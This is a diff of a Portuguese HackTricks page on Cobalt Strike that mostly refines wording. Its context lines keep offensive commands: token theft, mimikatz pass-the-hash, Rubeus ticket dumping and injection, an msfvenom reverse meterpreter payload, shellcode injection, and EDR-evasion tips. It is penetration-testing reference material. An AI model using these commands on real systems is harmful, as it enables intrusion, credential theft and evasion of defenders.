@@ -1,6 +1,6 @@
 # Cobalt Strike
 
-{{#include /banners/hacktricks-training.md}}
+{{#include ../banners/hacktricks-training.md}}
 
 ### Escutadores
 
@@ -14,8 +14,8 @@ Os beacons desses escutadores não precisam se comunicar diretamente com o C2, e
 
 `Cobalt Strike -> Escutadores -> Adicionar/Editar` então você precisa selecionar os beacons TCP ou SMB
 
-* O **beacon TCP irá configurar um escutador na porta selecionada**. Para se conectar a um beacon TCP use o comando `connect <ip> <port>` de outro beacon
-* O **beacon smb irá escutar em um pipename com o nome selecionado**. Para se conectar a um beacon SMB você precisa usar o comando `link [target] [pipe]`.
+* O **beacon TCP irá configurar um escutador na porta selecionada**. Para se conectar a um beacon TCP, use o comando `connect <ip> <port>` de outro beacon
+* O **beacon smb irá escutar em um pipename com o nome selecionado**. Para se conectar a um beacon SMB, você precisa usar o comando `link [target] [pipe]`.
 
 ### Gerar e Hospedar payloads
 
@@ -60,10 +60,10 @@ portscan [targets] [ports] [arp|icmp|none] [max connections]
 ## Importar módulo Powershell
 powershell-import C:\path\to\PowerView.ps1
 powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
-powershell <apenas escreva o cmd do powershell aqui> # Isso usa a versão mais alta do powershell suportada (não oppsec)
+powershell <apenas escreva o cmd powershell aqui> # Isso usa a versão mais alta do powershell suportada (não oppsec)
 powerpick <cmdlet> <args> # Isso cria um processo sacrificial especificado por spawnto, e injeta UnmanagedPowerShell nele para melhor opsec (sem registro)
 powerpick Invoke-PrivescAudit | fl
-psinject <pid> <arch> <commandlet> <arguments> # Isso injeta UnmanagedPowerShell no processo especificado para executar o cmdlet do PowerShell.
+psinject <pid> <arch> <commandlet> <arguments> # Isso injeta UnmanagedPowerShell no processo especificado para executar o cmdlet PowerShell.
 
 
 # Impersonação de usuário
@@ -85,13 +85,13 @@ steal_token [pid] # Além disso, isso é útil para ações de rede, não açõe
 ls \\computer_name\c$ # Tentar usar o token gerado para acessar C$ em um computador
 rev2self # Parar de usar o token de steal_token
 
-## Iniciar processo com novas credenciais
+## Lançar processo com novas credenciais
 spawnas [domain\username] [password] [listener] #Faça isso a partir de um diretório com acesso de leitura como: cd C:\
 ## Como make_token, isso gerará o evento Windows 4624: Uma conta foi logada com sucesso, mas com um tipo de logon de 2 (LOGON32_LOGON_INTERACTIVE). Ele detalhará o usuário chamador (TargetUserName) e o usuário impersonado (TargetOutboundUserName).
 
 ## Injetar em processo
 inject [pid] [x64|x86] [listener]
-## Do ponto de vista de OpSec: Não execute injeção entre plataformas, a menos que realmente precise (por exemplo, x86 -> x64 ou x64 -> x86).
+## Do ponto de vista de OpSec: Não realize injeção entre plataformas a menos que realmente precise (por exemplo, x86 -> x64 ou x64 -> x86).
 
 ## Pass the hash
 ## Este processo de modificação requer patching da memória do LSASS, o que é uma ação de alto risco, requer privilégios de administrador local e não é muito viável se o Protected Process Light (PPL) estiver habilitado.
@@ -100,7 +100,7 @@ pth [DOMAIN\user] [NTLM hash]
 
 ## Pass the hash através do mimikatz
 mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
-## Sem /run, o mimikatz gera um cmd.exe, se você estiver executando como um usuário com Desktop, ele verá o shell (se você estiver executando como SYSTEM, você está livre para ir)
+## Sem /run, o mimikatz gera um cmd.exe, se você estiver executando como um usuário com Desktop, ele verá o shell (se você estiver executando como SYSTEM, você está livre para prosseguir)
 steal_token <pid> #Roubar token do processo criado pelo mimikatz
 
 ## Pass the ticket
@@ -124,7 +124,7 @@ steal_token <pid>
 execute-assembly C:\path\Rubeus.exe triage
 ### Dump insteresting ticket by luid
 execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
-### Criar nova sessão de logon, note luid e processid
+### Criar nova sessão de logon, anotar luid e processid
 execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
 ### Inserir ticket na sessão de logon gerada
 execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
@@ -175,7 +175,7 @@ msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw 
 ps
 shinject <pid> x64 C:\Payloads\msf.bin #Injetar shellcode do metasploit em um processo x64
 
-# Passar sessão do metasploit para cobalt strike
+# Passar sessão do metasploit para o cobalt strike
 ## Gere shellcode Beacon stageless, vá para Ataques > Pacotes > Windows Executable (S), selecione o listener desejado, selecione Raw como o tipo de saída e selecione Usar payload x64.
 ## Use post/windows/manage/shellcode_inject no metasploit para injetar o shellcode gerado do cobalt strike
 
@@ -191,23 +191,23 @@ beacon> ssh 10.10.17.12:22 username password</code></pre>
 
 ### Execute-Assembly
 
-O **`execute-assembly`** usa um **processo sacrificial** utilizando injeção de processo remoto para executar o programa indicado. Isso é muito barulhento, pois para injetar dentro de um processo, certas APIs do Windows são usadas que todos os EDRs estão verificando. No entanto, existem algumas ferramentas personalizadas que podem ser usadas para carregar algo no mesmo processo:
+O **`execute-assembly`** usa um **processo sacrificial** utilizando injeção de processo remoto para executar o programa indicado. Isso é muito barulhento, pois para injetar dentro de um processo, certas APIs do Win são usadas que todos os EDR estão verificando. No entanto, existem algumas ferramentas personalizadas que podem ser usadas para carregar algo no mesmo processo:
 
 - [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
 - [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
-- No Cobalt Strike você também pode usar BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)
+- No Cobalt Strike, você também pode usar BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)
 - [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
 
-O script agressor `https://github.com/outflanknl/HelpColor` criará o comando `helpx` no Cobalt Strike que colocará cores nos comandos indicando se são BOFs (verde), se são Frok&Run (amarelo) e similares, ou se são ProcessExecution, injeção ou similares (vermelho). O que ajuda a saber quais comandos são mais furtivos.
+O script agressor `https://github.com/outflanknl/HelpColor` criará o comando `helpx` no Cobalt Strike, que colocará cores nos comandos indicando se são BOFs (verde), se são Frok&Run (amarelo) e similares, ou se são ProcessExecution, injeção ou similares (vermelho). O que ajuda a saber quais comandos são mais furtivos.
 
 ### Agir como o usuário
 
 Você pode verificar eventos como `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:
 
-- Segurança EID 4624 - Verifique todos os logons interativos para saber os horários de operação habituais.
+- Segurança EID 4624 - Verifique todos os logons interativos para conhecer os horários de operação habituais.
 - Sistema EID 12,13 - Verifique a frequência de desligamento/início/suspensão.
 - Segurança EID 4624/4625 - Verifique tentativas NTLM válidas/inválidas de entrada.
-- Segurança EID 4648 - Este evento é criado quando credenciais em texto claro são usadas para logon. Se um processo o gerou, o binário potencialmente tem as credenciais em texto claro em um arquivo de configuração ou dentro do código.
+- Segurança EID 4648 - Este evento é criado quando credenciais em texto simples são usadas para logon. Se um processo o gerou, o binário potencialmente tem as credenciais em texto claro em um arquivo de configuração ou dentro do código.
 
 Ao usar `jump` do cobalt strike, é melhor usar o método `wmi_msbuild` para fazer o novo processo parecer mais legítimo.
 
@@ -238,7 +238,7 @@ Ao se mover lateralmente, geralmente é melhor **roubar um token do que gerar um
 
 O Cobalt Strike tem um recurso chamado **Guardrails** que ajuda a prevenir o uso de certos comandos ou ações que poderiam ser detectados pelos defensores. Os guardrails podem ser configurados para bloquear comandos específicos, como `make_token`, `jump`, `remote-exec`, e outros que são comumente usados para movimento lateral ou escalonamento de privilégios.
 
-Além disso, o repositório [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) também contém algumas verificações e ideias que você poderia considerar antes de executar um payload.
+Além disso, o repositório [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) também contém algumas verificações e ideias que você pode considerar antes de executar um payload.
 
 ### Criptografia de Tickets
 
@@ -250,7 +250,7 @@ Ao usar o Cobalt Strike, por padrão, os pipes SMB terão o nome `msagent_####` 
 
 Além disso, com sessões SSH, um pipe chamado `\\.\pipe\postex_ssh_####` é criado. Mude-o com `set ssh_pipename "<new_name>";`.
 
-Além disso, no ataque de exploração pós-exploração, os pipes `\\.\pipe\postex_####` podem ser modificados com `set pipename "<new_name>"`.
+Além disso, no ataque de pós-exploração, os pipes `\\.\pipe\postex_####` podem ser modificados com `set pipename "<new_name>"`.
 
 Nos perfis do Cobalt Strike, você também pode modificar coisas como:
 
@@ -264,15 +264,15 @@ Nos perfis do Cobalt Strike, você também pode modificar coisas como:
 
 ### Bypass de varredura de memória
 
-Alguns EDRs escaneiam a memória em busca de algumas assinaturas de malware conhecidas. O Cobalt Strike permite modificar a função `sleep_mask` como um BOF que será capaz de criptografar na memória o backdoor.
+Alguns EDRs escaneiam a memória em busca de algumas assinaturas de malware conhecidas. O Cobalt Strike permite modificar a função `sleep_mask` como um BOF que será capaz de criptografar em memória o backdoor.
 
-### Injeções de processo barulhentas
+### Injeções de proc barulhentas
 
 Ao injetar código em um processo, isso geralmente é muito barulhento, pois **nenhum processo regular geralmente realiza essa ação e porque as maneiras de fazer isso são muito limitadas**. Portanto, pode ser detectado por sistemas de detecção baseados em comportamento. Além disso, também pode ser detectado por EDRs que escaneiam a rede em busca de **threads contendo código que não está no disco** (embora processos como navegadores usando JIT tenham isso comumente). Exemplo: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)
 
 ### Spawnas | Relações PID e PPID
 
-Ao gerar um novo processo, é importante **manter uma relação pai-filho regular** entre os processos para evitar detecção. Se svchost.exec estiver executando iexplorer.exe, parecerá suspeito, pois svchost.exe não é um pai de iexplorer.exe em um ambiente Windows normal.
+Ao gerar um novo processo, é importante **manter uma relação pai-filho regular** entre os processos para evitar detecção. Se svchost.exec estiver executando iexplorer.exe, parecerá suspeito, já que svchost.exe não é um pai de iexplorer.exe em um ambiente Windows normal.
 
 Quando um novo beacon é gerado no Cobalt Strike, por padrão, um processo usando **`rundll32.exe`** é criado para executar o novo listener. Isso não é muito furtivo e pode ser facilmente detectado por EDRs. Além disso, `rundll32.exe` é executado sem argumentos, tornando-o ainda mais suspeito.
 
@@ -358,10 +358,10 @@ template.x64.ps1
 # $x --> $ar  
 cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna  
 
-#kit de artefato  
+#artifact kit  
 cd  C:\Tools\cobaltstrike\ArtifactKit  
 pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
 ```
 
 
-{{#include /banners/hacktricks-training.md}}
+{{#include ../banners/hacktricks-training.md}}
